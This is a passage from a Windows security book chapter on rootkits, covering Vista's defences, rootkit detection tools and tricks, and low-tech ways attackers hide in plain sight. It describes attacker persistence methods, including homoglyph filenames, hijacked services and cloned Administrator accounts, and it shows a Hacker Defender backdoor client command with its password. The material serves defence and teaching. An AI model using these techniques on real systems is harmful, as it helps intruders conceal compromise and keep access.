needs to locate to properly patch the kernel objects it manipulates .  Should the authors or the rootkit community at large decide to do this and attempt  to create a version of FUTo or similar kernel-mode rootkits for the 64-bit platform, they  will be confronted with yet another security change that applies only to the 64-bit versions  of Vista: Kernel-mode Code Signing  KMCS . Vista 64-bit versions enforce a new policy  that requires all kernel modules to be signed with a special code-signing certificate. If an  administrator attempts to load an unsigned driver, even if the attempt is from an elevated  process, Vista x64 will prevent the driver from loading.  Vista  is  the  first  Microsoft  operating  system  to  offer  built-in  full-volume  encryption  capability, and with this ability comes a new security feature known as Secure Startup. During the design of Vista, bootkits such as eEye’s Bootroot and the VBootkit were very  much part of the threat model. With the introduction of TPM 1.2 processors built-in to  many notebooks and system mainboards, it is now possible to mitigate these types of  attacks and to prevent the operating system from starting if an attempt has been made to  tamper with it during the boot process. When Vista’s BDE has been enabled on a machine  equipped  with  a  TPM  1.2  processor,  Secure  Startup  is  enabled  and  enforced.  Secure  Startup works by measuring a known-good boot process and storing these measurements  in the TPM 1.2 module. These measurements are basically SHA-1 hashes of the code that  is about to be executed by the next step in the boot process. On subsequent boots of the  system,  these  measurements  are  taken  again  and  compared  to  the  known-good  measurements, and if they are found to differ, the TPM will not unseal the encryption  keys needed to decrypt the OS boot volume. In the VBootkit scenario, where the MBR is  read off a CD prior to reading the trusted MBR from the hard drive, the CD’s MBR code  will be measured  SHA-1 hashed  and stored in a Platform Configuration Register  PCR   in the TPM 1.2 module. The hash value stored in the PCR will not be the expected value,  the TPM 1.2 module will not unseal the keys needed to decrypt the OS, and the boot  process will be halted.  For  more  information  on  Secure  Startup  in  Windows  Vista,  refer  to  the  technical  overview  at  http:  download.microsoft.com download 5 D 6 5D6EAF2B-7DDF- 476B-93DC-7CF0072878E6 secure-start_tech.doc.  A Windows Vista Ultimate Extra add-on is available for download; it takes care of initializing a TPM 1.2  module and reconfiguring Vista to use BDE in Secure Startup mode. The operating system volume  can even be encrypted in the background while you continue to work to minimize downtime.   Chapter 8:  Achieving Stealth and Maintaining Presence   251  Other Security Enhancements  Another interesting door that has been closed to attackers on all versions of Vista is the  removal of the \Device\PhysicalMemory section object from user mode. As mentioned  earlier, only limited examples of real-world malware and rootkits in the wild make use  of this object to manipulate kernel memory from user mode.  Access to this object was first restricted to kernel mode in Windows Server 2003 SP1 and the policy  remains unchanged in Vista.  Raw  disk  access  from  user  mode  is  also  no  longer  permitted  in  Vista,  even  for  administrators and elevated processes. Raw disk access refers to using the CreateFile   API and referencing a disk using a special notation  \\?\PhysicalDriveN . Microsoft  published a KB article describing this technique at http:  support.microsoft.com kb  q100027 , and more information on the topic can be found in the MSDN documentation  for CreateFile.  This  technique  was  used  by  Joanna  Rutkowska  in  2006  as  part  of  her  Bluepill  demonstration for bypassing the Vista x64 Kernel-mode Code Signing requirements. In  summary, Joanna found that using raw disk access, she was able to modify the pagefile  .sys and overwrite existing driver code that had been paged out to disk. When the driver  code  was  paged  back  into  main  memory,  she  had  successfully  bypassed  the  KMCS  requirements  of  the  x64  platform.  On  Windows  Vista,  raw  disk  access  can  only  be  achieved using a device driver.  Summary of Vista vs. Rootkits  With Windows Vista, Microsoft made significant changes at all levels of the operating  system to make it more resilient to unintentional or intentional tampering. However, due  to application compatibility concerns, some of these enhancements can be applied only  to 64-bit versions of the operating system.  As  a  result  of  these  changes,  on  64-bit  versions  of  Vista,  rootkit  authors  have  the   following options available to them:     Pursue kernel-mode stealth, which now requires a device driver  due to removal   of \Device\PhysicalMemory . This implies signing their rootkit drivers with  code signing certiﬁ cates that chain up to a trusted root certiﬁ cation authority;  ﬁ nding a way to bypass UAC or tricking users into elevating a driver installer  stub program; or ﬁ nding a way to disable or bypass KPP, which will detect  attempts to patch the kernel.     Use well-known user-mode stealth techniques and avoid the kernel altogether.  One thing is certain; it will be fascinating to see how things play out on the 64-bit version  of Vista over the next few years and to see which direction the malware writers go.   252   Hacking Exposed Windows: Windows Security Secrets & Solutions   ROOTKIT DETECTION TOOLS AND TECHNIQUES  During the rise of the rootkit came a corresponding rise of the rootkit detection tool. A  few years ago, only a few public rootkit detection tools existed, but today dozens of them  are available from both individuals with questionable backgrounds and motives as well  as those from respected software vendors. In this section we attempt to enumerate the  approach used by some of the more popular tools, provide you with resources you can  use to investigate these tools, and disclose tips and tricks that can be used to catch some  of today’s nastiest rootkits such as Rustock.  Rise of the Rootkit Detection Tool  In late 2003 and early 2004, Joanna Rutkowska released a tool called KLister that could  be used on Windows 2000 systems to dump a list of processes using a driver loaded into  the kernel. The tool was, shall we say, “expert friendly,” but it was, as far as we know, the  first publicly available tool of its kind that attempted to give the user a different view of  the system’s running processes than what was obtained by possibly hooked APIs. Joanna  continued her excellent work in this field and has subsequently published many more  rootkit-related tools including her latest release—the System Virginity Verifier. SVV is an  interesting  tool  that  makes  use  of  an  approach  called  cross-view–based  detection. All  of  Joanna’s tools can be downloaded for free at http:  invisiblethings.org tools.html.  In 2004, James Butler released VICE, arguably one of the best rootkit detection tools  available at the time. VICE had a nice GUI written for the .NET platform and it was able  to identify popular forms of both user-mode and kernel-mode stealth in use at the time,  including patched functions, address table hooks, and alterations to key data structures  such as the SSDT in the kernel.  Also in 2004, Microsoft Research jumped into the foray by presenting its approach  to rootkit detection, which it called cross-view–based detection when it released a research  paper  on  the  topic:  http:  research.microsoft.com research pubs view.aspx?type=  Technical%20Report&id=775. The Strider team in Microsoft Research had previously  been investigating ways to determine system changes via the AskStrider tool when its  members became interested in rootkit detection. The rest, as they say, is history: this  team has continued to focus research effort in this area and has released a number of  additional  papers  and  tools  to  the  public,  which  can  all  be  downloaded  at  http:   research.microsoft.com rootkit .  In 2005, Mark Russinovich released Rootkit Revealer, which used a cross-view–based   approach to detect not only hidden files, but hidden Registry entries as well.  Finally in 2006 and 2007, rootkit detection tools have become plentiful and a dedicated  website, www.antirootkit.com, has been established to promote advances in this area. At  the time of this writing, antirootkit.com was linking to 31 different rootkit detection tools  for a variety of OSs ranging from OSX, to Linux, to Windows. Some of the more popular  and effective anti-rootkit tools in 2006 were IceSword, GMER, and RKUnhooker, all of  which can be found on antirootkit.com.   Chapter 8:  Achieving Stealth and Maintaining Presence   253  As rootkit detectors started to become popular and widely used, some rootkit authors  started targeting them directly to prevent the tools from reporting accurate results on the  systems  they  were  scanning  using  so-called  implementation-specific  attacks.  This  could  range  from  simply  adding  the  rootkit  detector  to  a  root  process  list   that  is,  a  list  of  processes allowed to “see” everything that is normally hidden by the rootkit; this works  well  for  cross-view–based  detectors ,  to  performing  application-specific  tricks,  to  completely  DDoSing  the  site  hosting  the  tool  to  prevent  people  from  being  able  to  download  it.  Holy  Father,  author  of  the  popular  Hacker  Defender  rootkit,  for  years  offered paid versions of the rootkit before retiring from the scene in late 2006. The later  versions of the rootkit  at one time  were able to bypass all well-known rootkit detectors  using a combination of techniques.  The linkage between so-called proof-of-concept rootkit authors and rootkit detection  tools is also interesting to note. As an example, the author s  of the Unreal.A rootkit  have also created a rootkit detector called RKUnhooker. In a post on rootkit.com, the  authors claim to have authored the Unreal. A rootkit to, among other things, prove the  ability of the RKUnhooker rootkit detection tool and demonstrate weaknesses in other  anti-rootkit tools.  The  problem  of  rootkit  authors  studying  the  popular  and  widely  available  anti- rootkit tools and then finding weaknesses in them that can be exploited is not going to  go away; it is a continual game of cat and mouse. For this reason, some security researchers  author their own private rootkit detection tools and never release them to the public.  Joanna Rutkowska summarizes this situation quite nicely in her presentation on SVV  and the OMCD  Open Methodology for Compromise Detection . She says that because  only a finite number of ways can be used to achieve stealth on a system, if these methods  could  be  enumerated  and  enough  tools  written  by  enough  people,  it  would  prevent  implementation-specific  attacks  on  rootkit  detection  tools  that  have  become  quite  common, since so many tools would be in existence.  Cross-View–Based Rootkit Detection  The concept behind cross-view–based detection is, essentially, to ask the same question  twice but in slightly different ways, with the theory being that if everything is fine, you  should  get  the  same  answer  both  times,  but  if  one  method’s  answer  differs  from  the  other,  then  you  know  something  suspicious  has  happened  that  warrants  further  investigation.  For  example,  one  interesting  way  to  detect  hidden  files  is  to  use  the  Windows API to get a list of files in a folder, and then to use raw disk access  discussed  earlier  to read the Master File Table that contains a list of files. Any files that are listed in  the MFT but that are not known to the Windows API are probably being actively hidden.  This is one of the earliest examples of cross-view–based detection that we know.  Dennis Middleton, an engineer at Microsoft, was one of the first people to suggest a  tool  based  on  this  technique   that  was  later  used  by  the  PSS  Security  team  quite  extensively   long  before  the  term  was  coined.  This  technique  proved  devastatingly    254   Hacking Exposed Windows: Windows Security Secrets & Solutions   effective against file hiding rootkits such as Hacker Defender, and it was one of the first  tools  that  the  PSS  Security  team  ran  when  responding  to  possible  intrusions.  Shortly  after this tool was developed, another tool called Rootkit Revealer  RKR  was released  by Mark Russinovich that operated on essentially the same principle, but extended the  cross-view–based  detection  to  the  Registry  as  well.  With  RKR,  you  could  finally  find  both  hidden  files  and  Registry  keys  and  values.  This  proved  exceedingly  useful  on  a  number  of  hacking  cases  involving  user-mode  rootkits  that  loaded  as  a  DLL  via  the  AppInit_DLLS registry key but hid only processes, not files. Usually these rootkits would  actively attempt to hide the rootkit DLL referenced in this Registry value by preventing  it from being displayed by various Registry editing tools. RKR was able to pierce this  stealth and display the hidden entries.  Finally,  Joanna  Rutkowska  took  cross-view  detection  to  the  next  level  with  the  release of SVV 1.0. This tool can be used to detect rootkits that alter code in memory,  such as rootkits that attempt to patch functions in memory. The concept employed by  SVV  compares  the  .text  section  of  the  binary  on  disk   the  part  of  the  executable  file  format  that  contains  the  programs  code   with  the  representation  of  this  section  in  memory. If they differ, you know the code has been altered in memory and you should  determine why.  Ad Hoc Rootkit Detection Techniques  Detecting the presence of stealth software usually comes down to discovering something  that the rootkit author either “forgot” to hide or simply didn’t know could be used to  detect the rootkit. Oftentimes these shortcomings are addressed in subsequent versions  of the rootkit. However, by modifying system or application code or data, side effects or  unintended consequences can lead to a wide range of symptoms. In fact, many of the  cases we’ve investigated started out as some system or application behaving strangely or  just  outright  crashing  or  displaying  blue  screens.  Hiding  is  easy,  but  hiding  well  is  hard—really hard. Dumping Process Memory WinDBG  is  a  popular  free  debugger  available  for  download  from  Microsoft.  One  interesting aspect of the Hacker Defender rootkit is that it hooks the virtual memory  APIs in all running non-root processes to prevent user-mode debuggers like WinDBG  from being able to “see” the function hooks that are installed in processes hooked by  Hacker Defender. Ironically, as a side effect of this anti-debugging behavior, it allows you  to detect the rootkit’s presence using a single command in the debugger. WinDBG has  the  ability  to  create  a  memory  dump  of  a  process,  which  essentially  writes  all  of  the  available pages of a processes memory to a file for later analysis in a debugger. When  Hacker  Defender  is  running  on  a  system,  you  will  get  an  error  if  you  try  to  create  a  memory dump of a running process. As a quick test, you can run Notepad.exe, attach  WinDbg to it, and then try to generate a full memory dump of the process, as shown in  Figure 8-11.   Chapter 8:  Achieving Stealth and Maintaining Presence   255  Figure 8-11  Hacker Defender 1.00 versus WinDbg  Detours and Problems with Call Stacks In 1999, Galen Hunt and Doug Brubacher of Microsoft Research published a research  paper  titled  “Detours:  Binary  Interception  of  Win32  Functions”   http:  research  .microsoft.com sn detours  . Since then, not only have some third-party applications  made use of this technique to modify Windows API behavior, but malware authors have  also  used  the  same  technique  to  achieve  their  goals.  One  way  to  detect  such  API  interceptions is the use of the WinDbg’s !chkimg command in combination with !for_ each_module.  The  following  Microsoft  Knowledge  Base  article  has  detailed  information  on  how  to  use  these  commands and what to look for in the output: http:  support.microsoft.com kb 920925.   256   Hacking Exposed Windows: Windows Security Secrets & Solutions   Enabling Boot Logging to Detect Rustock  and Other Driver-Based Rootkits Rootkit authors often fail to account for diagnostic and recovery features of the OS when  developing rootkits. For example, early rootkits would often add driver entries to the  Registry or create new services but would then fail to configure them so that they would  also start when Windows was booted in Safe Mode. As a result, all you needed to do was  boot the system in Safe Mode to prevent the rootkit code from loading and the hidden  files and services were visible! Rustock is a stealthy rootkit but it can be detected without  using any special tools by doing nothing more than running a system command and  rebooting the machine!  The trick to detecting Rustock and other kernel-mode rootkits such as Unreal that  load at system start via device drivers is to enable boot logging on a system. To enable  boot logging, simply run msconfig.exe, and on the boot.ini tab, click the checkbox next  to  BOOTLOG  or click the checkbox next to Boot Log on the Boot tab in Vista  and then  reboot the system.  Figures 8-12 and 8-13 show how to configure this on Windows XP and Vista.  Figure 8-12  Using msconﬁ g.exe to enable boot logging on Windows XP   Chapter 8:  Achieving Stealth and Maintaining Presence   257  Figure 8-13  Using msconﬁ g.exe to enable boot logging on Vista  After the system has restarted, a new file in the Windows directory called ntbtlog.txt  should be visible  if it’s not, that’s suspicious , and it should contain an entry for each  kernel  driver  that  was  started  during  the  boot  process   unless  it  has  been  explicitly  removed by a rootkit . At this point, you have a couple of options for detecting hidden  drivers. First, you could perform a cross-view–based approach to detecting the hidden  Rustock driver by comparing the list of drivers you see loading via the ntbtlog.txt to the  list of drivers currently visible  as displayed via some other tool such as Autoruns.exe  while the system is online . Or you could simply take advantage of the fact that normal  device drivers don’t typically load from an Alternate Data Stream and you could search  the ntbtlog.txt file for the string system32:.  Following  is  some  output  from  the  ntbtlog.txt  of  a  machine  running  the  Rustock   rootkit: Loaded driver \SystemRoot\System32\Drivers\Fs_Rec.SYS Loaded driver \SystemRoot\System32\Drivers\Null.SYS Loaded driver \SystemRoot\System32\Drivers\Beep.SYS Loaded driver \SystemRoot\System32:18467 < — Rustock driver in an ADS Loaded driver \SystemRoot\System32\drivers\vga.sys   258   Hacking Exposed Windows: Windows Security Secrets & Solutions   In this ntbtlog.txt, you can see the machine is running Rustock, Unreal, and Hacker   Defender: Loaded driver ACPI.sys ... Loaded driver \SystemRoot\System32\Drivers\Null.SYS Loaded driver \SystemRoot\System32\Drivers\Beep.SYS Loaded driver \SystemRoot\System32:18467 < — Rustock Loaded driver \SystemRoot\System32\drivers\vga.sys Loaded driver \SystemRoot\System32\Drivers\mnmdd.SYS ...

Loaded driver \SystemRoot\system32\drivers\kmixer.sys Loaded driver \??\C:\Documents and Settings\User\Desktop\hxvariant\ hxdef100r\hxdefdrv.sys < — Hacker Defender  Show Hidden Devices in Device Manager Another interesting way to detect some older kernel-mode rootkits that load via device  drivers  is  to  use  a  feature  of  the  Windows  Device  Manager  that  allows  you  to  view  legacy and other normally hidden device drivers. To enable this feature, open Device  Manager, and choose View  Show Hidden Devices. When this option is enabled, a new  category  of  devices  shows  up  entitled  Non-Plug  and  Play  Drivers,  and  some  older  rootkits may show up in this listing. BootExecute Registry Entry The BootExecute Registry entry represents one of the earliest entry points that programs   good  or  bad   can  use  to  execute  during  the  boot  process   with  the  exception  being  “bootkits,” which load from a boot sector much earlier in the boot process . This Registry  key is used by the Windows Session Manager to run tasks during the boot process and is  used primarily by the Windows Check Disk  chkdsk.exe  utility to scan disks for problems  before most drivers and services are given a chance to load. An interesting technique  observed in some of the newer rootkit detection tools is to use this BootExecute Registry  value to facilitate rootkit detection. Since whatever is listed in this Registry key executes  before most drivers and services have had a chance to load, the program being executed  has a fairly clean view of the file system and Registry. The word fairly is used here because  drivers  marked  as  boot  drivers  in  the  Registry   SERVICE_BOOT_START   get  loaded  before any programs listed in this Registry value.  An astute reader will note that this implies that kernel-mode rootkits simply need to mark themselves  as boot start drivers to load before BootExecute programs.  Imagine a program that loaded very early in the boot process via this Registry key  and then took a snapshot of the services and drivers listed in the Registry before these    Chapter 8:  Achieving Stealth and Maintaining Presence   259  drivers or services are started, and then after the system finishes booting that program  takes another snapshot and compares the two snapshots to find any drivers or services  that are hidden. This technique has been used by software such as UnHackMe 4.0, which  makes use of the Partizan rootkit detection tool.  In the game of cat and mouse constantly being played between the good guys and  the bad guys, the winner is usually the one who can load his code first, and this unique  entry point represents an opportunity for both sides.  Network-Based Detection of Hacker Defender Hacker Defender’s built-in backdoor was fairly innovative when compared to backdoors  commonly in use at the time the rootkit was released. When Hacker Defender loads, not  only does it hide processes, files, and folders, but it also sets up a backdoor that can be  reached on any TCP endpoint that was created by a user mode application. For example,  the RPC End Point Mapper  RPC EPM  is a well-known TCP endpoint that listens on  TCP 135. This TCP port is created from a user mode process called SVCHOST.EXE  on  Windows 2000 and later . Because the endpoint is created by a user-mode application  and Hacker Defender is a user-mode rootkit, it is able to intercept all packets destined for  this and any other TCP port that a user-mode process is listening on. Some ports, however,  such as the well-known TCP ports 139 and 445, cannot be used by the Hacker Defender  backdoor, as these endpoints are created from a kernel-mode driver  srv.sys ; as such,  Hacker Defender is not able to intercept packets destined for these ports since it performs  function patching only in user-mode processes.  With a traditional backdoor Trojan, the backdoor typically creates a new port to listen  on  say port 666 , and even if the port is hidden locally using a user-mode rootkit, the  listening port would likely be visible using something like a network port scan of the  machine.  If  the  backdoor  listening  on  port  666  had  its  port  hidden  locally  from  an  administrator attempting to use the netstat command to list all of the listening ports,  it would be visible to someone performing a port scan of the machine and thus fairly  easy to detect. With the Hacker Defender’s backdoor, no additional ports are created; it  simply inspects all packets destined for all user-mode processes, and if the packet was  created by the backdoor client, the packet is sent down a special code path.  The process used is very similar to that used to hide files and folders. The rootkit  code inspects the data  the returned list of files, folders, or in this case the packet  and  then takes action based on the results of that inspection. In essence, with Hacker Defender  installed, there are two code paths for each user-mode TCP endpoint: the intended one,  which results in the normal operation of the network server listening on that port, and  the one that gives the attacker remote access to the system via the built-in backdoor code.  As stealthy as this approach may seem, it still allowed for easy detection via the network  due to the design of the network backdoor.  In late 2004 a tool was posted to the Full-Disclosure mailing list that allowed users to  scan a range of IP addresses looking for hosts with Hacker Defender installed. The tool  worked by sending the Hacker Defender master key  which was simply 32 bytes of data   for various versions of the rootkit to various ports in a range of IP addresses supplied by  the user and inspecting the response. If the master key was accepted, it was presumed  that the backdoor was functioning on that port and the user was alerted.   260   Hacking Exposed Windows: Windows Security Secrets & Solutions   Following is the output of the Hacker Defender backdoor client  bdcli100.exe  making  a  connection  to  a  machine  with  the  Hacker  Defender  rootkit  installed  and  accepting  connections on all user-mode TCP ports  in this case, TCP 135 is used for the backdoor  connection : C:\>bdcli100.exe 169.254.157.32 135 hxdef-rulez connecting server ... receiving banner ... opening backdoor .. backdoor found checking backdoor ...... backdoor ready authorization sent, waiting for reply authorization - SUCCESSFUL backdoor activated!

Note how easy it would be to change the name of the section object used by Hacker  Defender to make it blend in more with the surrounding environment. Event Log–Based Detection Many intrusions leave forensic evidence behind in the event logs, usually in the form of  Service Control Manager System Event Log entries, indicating the successful installation  of the malware and starting of new services  or sometimes application crashes or other  events related to the intrusion .

Figure 8-14  WinObj displaying the section object created by Hacker Defender   262   Hacking Exposed Windows: Windows Security Secrets & Solutions   THE FUTURE OF ROOTKITS  As rootkits for Windows have evolved over the years, it has become clear that the code  that loads first and operates at the lowest level wins. It is for this reason that most rootkit  authors want to load their code in ring 0 so that they can exert maximum control over the  OS and the applications running on it. Many software security vendors also implement  software that operates in ring 0 so as not to be at a disadvantage to threats operating at  this level, and often the battle for achieving stealth is conducted entirely in kernel mode.  This  has  become  a  double-edged  sword  for  malware  authors  and  software  security  vendors alike, because writing solid code that runs in kernel mode without problems is  challenging, and mistakes and buggy code in ring 0 usually end up crashing the operating  system. But what if a ring lower than 0 were available in which malicious code could run?  What about a ring –1? This is sort of like what hardware virtualization support in modern  CPUs  offers,  and  proof-of-concept  rootkits  have  already  been  written  that  can  take  advantage of these new CPU features that take the game of stealth to the next level.  For those not familiar with popular virtualization products available today, such as  Virtual PC or VMWare, these products allow you to run an operating system  the guest  OS  inside of an application that is itself running within an operating system  the host  OS . In theory, the guest operating system has no idea that it is running virtualized within  an  application  on  a  host  operating  system.  In  reality,  applications  running  in  a  guest  operating system have numerous ways to detect that they are running in a VM  virtual  machine  due to the design of the software sandbox  VM  in which they are running.  Normally, to run an operating system in a VM you need to install specialized software.  But what if a rootkit, when activated, were able to become the new host operating system  by effectively moving the former host operating system  the one you are using  into a  VM on the fly, making it a guest OS?  This is the concept employed by hypervisor-based rootkits such as Vitriol  written by  Dino Dai Zovi  for MacOS X using the Intel VT-x extensions and Blue Pill for Windows  Vista  x64  using  the  AMD64-V  extensions  written  by  Joanna  Rutkowska.  Debate  on  whether the presence of hypervisor-based rootkits such as Vitriol and Blue Pill can be  detected from within the virtualized guest operating system is ongoing, but according to  the manufacturers’ own specifications, the ability for an application to detect whether it  was  running  inside  of  a  virtual  machine  would  be  considered  a  design  flaw  in  the  virtualization  extensions.  As  with  other  traditional  rootkits,  it  seems  that  the  only  winning move is not to play, or in this case, either to disable support for these extensions  in the PCs BIOS  if possible  or install a non-malicious hypervisor first, before a malicious  one can be installed.  ARE ROOTKITS REALLY EVEN NECESSARY?  Rootkits and rootkit detection tools seem to have fallen into a harmonious cycle in recent  years. Outside of academic rootkits  those posted publicly for review, discussion, and or  education , commercial rootkits are created and released into the wild for financial gain,  to protect adware, spyware, bots, Trojans, backdoors, and Trojan downloaders. In the    Chapter 8:  Achieving Stealth and Maintaining Presence   263  past,  we  have  seen  rootkits  installed  via  browser-based  drive-by  exploits,  and  more  recently we’ve seen mass-mailing worms like the Storm worm dropping rootkits after  using social engineering techniques to fool users into installing them; we’ve also seen  them installed by opening malformed documents that exploit security vulnerabilities.  Eventually, sometimes only after many months and tens of thousands of computers are  compromised,  someone,  somewhere  figures  out  that  a  new  advanced  rootkit  is  on  a  machine and begins to analyze it and link it to some other malware it is usually trying to  hide. A weakness is invariably found, findings are published, and tools are written that  exploit that weakness to facilitate detection. Lather, rinse, repeat.  A rootkit that was successfully hiding malware in the wild for months can suddenly  be rendered useless by the discovery of a weakness in the techniques used to achieve  stealth,  especially  when  that  weakness  is  exploited  by  popular  software  such  as  the  rootkit  detection  tools  found  in  most  popular  antivirus  software  and  those  listed  on  www.antirootkit.com. Ironically, sometimes the worst thing you can do to achieve stealth  is to use stealth techniques.  Years ago, when this author was helping a large organization battle some determined  malicious hackers, the hackers were using a rootkit that consisted of only three files: a  kernel-mode  driver,  a  user-mode  DLL,  and  an  .INI  file   used  to  configure  the  rootkit  settings . The rootkit made its presence known initially by causing one of the customer’s  file servers to blue screen. After debugging pointed to a mysterious and unknown device  driver, the PSS security team was called to investigate. At the time, it just so happened  they were working on a new approach to rootkit detection that was easily able to detect  the files being hidden by the rootkit.  This customer had a large number of machines, and it seemed like the rootkit was  being found on machines faster than they could take them offline and rebuild them. But  then  suddenly,  and  for  no  apparent  reason,  they  stopped  finding  the  rootkit  on  compromised machines with the rootkit detection tool. Had the bad guys given up and  gone  home?  Not  likely. As  they  continued  to  investigate,  they  eventually  discovered  that, at least on some machines, the attackers were getting in by exploiting a vulnerability  in a service running as the all powerful SYSTEM account. The shellcode that was being  run would simply fetch a file from a remote server  via HTTP using the WinInet API  and  then  execute  it.  It  was  discovered  that  when  using  the  WinInet APIs  from  a  process  running  as  SYSTEM,  any  files  downloaded  would  be  saved  to  the  Internet  Explorer  Temporary Internet Files folder in the default user profile. They found this by examining  the system for newly created files on or around the time the system was determined to  have been compromised  through log file analysis and so on . They eventually found a  single GIF file created in the Temporary Internet Files folder on all of these machines  around  the  time  they  were  determined  to  have  been  compromised.  But  why  would  attackers download a GIF to the machine? Upon closer inspection, they discovered that  the file was not really a GIF—it was an executable with a GIF file extension. The attackers  had  switched  from  using  a  DLL-based  backdoor  hidden  by  a  kernel-mode  rootkit  to  using a DLL-based backdoor not hidden by a kernel-mode rootkit, but with a .GIF file  extension, running from a folder where one might expect to find a lot of GIF files. They  were cleverly hiding in plain sight without resorting to any form of active stealth. Instead  they were using camouflage.   264   Hacking Exposed Windows: Windows Security Secrets & Solutions   Programs can still be executed and libraries can still be loaded in a process, regardless of the file’s  extension. To  test  this  out,  simply  copy  notepad.exe  to  a  temporary  folder  and  give  it  a  different  extension  try naming it NOTEPAD.GIF . If you open a command prompt and then type NOTEPAD  .GIF, you will see that Notepad runs.  As we close out this chapter on achieving stealth, we will examine some of the clever  ways  in  which  malicious  hackers  can  hide  in  plain  sight,  without  resorting  to  any  traditional rootkit techniques. Often these low-tech approaches to hiding can be just as,  or even more, effective than employing some form of active stealth. The advantage of  using the techniques documented here would be reduced risk of application or operating  system instability, while the disadvantage would be exposure to antivirus applications.  Homoglyph Attacks A homoglyph is a symbol or glyph that looks very similar to another symbol or glyph but is  in  fact  distinctly  different.  Operating  systems  represent  the  symbols  or  glyphs  that  are  displayed  by  various  alphabets  and  written  languages  on  the  screen,  internally  using  Unicode code points. For example, the Cyrillic small letter e is represented by the Unicode  code point U+0435, while the Latin e  the one we use when displaying text in English  is  represented by the Unicode code point U+0065. The Cyrillic e is shown in Figure 8-15 in the  Windows Character Map utility  charmap.exe . By default, on English versions of Windows,  these two different glyphs appear visually to be the same, but since they are represented  internally as different Unicode code points, they are technically quite different.  Figure 8-15  Character Map showing Cyrillic e   Chapter 8:  Achieving Stealth and Maintaining Presence   265  A great resource for examining Unicode code points is www.unicode.org.  Malicious  attackers  can  exploit  this  visual  phenomenon  to  attempt  to  hide  their  malicious  binaries  in  plain  sight.  Often  attackers  who  want  to  run  programs  on  a  compromised computer want those programs to look exactly like legitimate programs  that people are used to seeing in tools such as Task Manager, so that they may not pay  them any special attention. The problem is that in a given folder, there can be only one  file with a given name; an attempt to create a second file with that same name results in  an error. For example, suppose an attacker wanted to drop her backdoor on a system and  name it explorer.exe. Since the legitimate explorer.exe already exists in the C:\WINDOWS  folder by default, the attacker would have to place her look-alike version of explorer.exe  in some other folder. A clever system administrator may notice that a second copy of  explorer.exe was running, and that it was running from the wrong folder. To resolve this  problem, a malicious attacker could resort to using a homoglyph for one of the letters in  the name explorer.exe, and then place the file in the same folder as the real explorer.exe.  In Figure 8-16, the Cyrillic lowercase e is used as a homoglyph for the Latin lowercase e to place another copy of the real explorer.exe in the Windows folder. It looks like the real  thing.  The real explorer.exe shows up on the left-hand side of Figure 8-16 and the fake  explorer.exe using the Cyrillic e appears at the very far right.   Although  it  can  be  challenging  to  spot  files  using  homoglyphs  in  Explorer,  it  is   The advantage  for the attacker  of using this technique is that it’s very simple to  create  files  with  filenames  that  look  like  legitimate  system  files;  when  these  files  are  executed, they appear to be running from the proper directory  as seen from utilities  such as Task Manager or Process Explorer . relatively easy when using the DIR command in a command shell, as shown here: 08 23 2001  08:00 AM             9,522 Zapotec.bmp 08 23 2001  08:00 AM               707 _default.pif 08 04 2004  01:56 AM         1,032,192 ?xplorer.exe              168 File s      13,642,710 bytes               36 Dir s   12,241,850,368 bytes free C:\WINDOWS> Note that the Cyrillic e is displayed as a question mark  ?  symbol in the DIR listing  output in the command shell on an English version of Windows.  You can imagine other interesting variations on this technique—perhaps using non- printable characters  CR, LF, and so on  or even printable but invisible characters such as  a space.  Hijacking Legitimate Services If you have used Windows for any amount of time, you have probably seen or heard of  the Alerter service. Its installed by default, and until recently  XP SP2 , it was enabled by  default  on  Windows.  Normally,  the  Alerter  service  points  to  the  command  line  C:\ WINDOWS\System32\svchost.exe -k LocalService.   266   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 8-16  Explorer.exe using a homoglyph  What if a malicious hacker changed that command line to point to a backdoor and  configured  the  service  to  run  as  the  SYSTEM  account  while  leaving  the  name  and  description the same? Perhaps the malicious hacker points the service to a file named  Explorer.exe running in the Windows folder, but with a Cyrillic e? Again, no active stealth  is needed here; the hacker has simply repurposed an existing service to make it run the  malicious backdoor. Many administrators know to look for suspicious services manually,  but the Alerter service is hardly suspicious.  Cloned Administrator Accounts What makes the local Administrator account the true Administrator? As it turns out, its  just a couple of Registry values  F for fixed and V for variable  in a part of the SAM that  is not normally accessible even to the local administrator. But this part of the SAM is accessible to software running as the SYSTEM account. The concept employed here is to  take a low-privileged user account in the SAM and to populate its F value with the data  from the built-in Administrator account’s F value.   Chapter 8:  Achieving Stealth and Maintaining Presence   267  Figure 8-17  Regedit.exe running as SYSTEM displaying the Administrator account F and V values  The interesting thing about this approach is that the user account that is manipulated  in this way does not show up as a member of the local Administrators group, yet when  it’s  used  for  logon,  it  has  the  same  privileges  as  the  built-in  Administrator  account,  making this a very stealthy backdoor that attackers can use on compromised systems.  We are not aware of any automated tools to identify cloned Administrator accounts  at this time, but manual inspection can be performed by running the Registry Editor as  SYSTEM  using the AT scheduler with the  INTERACTIVE switch to spawn a copy of  CMD.EXE as SYSTEM and then running REGEDIT.EXE from that CMD shell , exporting  the Registry keys for each user, and manually comparing the F and V values for each user  to those of the built-in Administrator account  Figure 8-17 .  Hiding in Hidden Folders with Restrictive Permissions Another  commonly  used  technique  is  to  place  malware  in  the  ‘ :\System Volume Information’ folder. This hidden folder is used by Windows for such things as  providing System Restore functionality, and the permissions on the folder, by default,  grant only the SYSTEM account access to the folder. A malicious hacker may place her    268   Hacking Exposed Windows: Windows Security Secrets & Solutions   backdoor Trojan in this folder via a remote shell exploit targeted against a service that is  running  as  SYSTEM.  Then  by  hijacking  an  existing  service  that  runs  as  the  SYSTEM  account   perhaps  one  that  wouldn’t  be  missed  that  starts  by  default,  such  as  the  Distributed Link Tracking Client service  and changing it to point to the backdoor that  she placed in this folder, she can effectively hide her files on the file system from an  Administrator attempting to enumerate all files and folders using DIR  S. The files are  in  a  hidden  folder  and  the  service  running  the  backdoor  is  the  one  expected  to  be  running.  Alternate Data Streams It never ceases to amaze us that more malicious hackers and more malware don’t make  use of the Alternate Data Streams  ADS  feature of Windows. An ADS is a stream of data  associated with a file. ADSs have been around as long as NTFS, but they haven’t been  used  by  many  either  for  good  or  bad  purposes.  Some  antivirus  software  and  backup  software  make  use  of  ADSs  to  mark  or  tag  files  with  metadata  appropriate  to  the  application. More recently, the Attachment Manager API makes use of ADSs to mark  what Internet Explorer zone a file was downloaded from so that the shell can display an  appropriate  warning  to  a  user  when  he  tries  to  run  an  unsigned  binary  that  was  downloaded from the Internet Zone. More recently, we’ve seen the Rustock rootkit taking  advantage of the inherent stealth provided by an ADS on Windows.  Why are ADSs such a powerful way to hide on 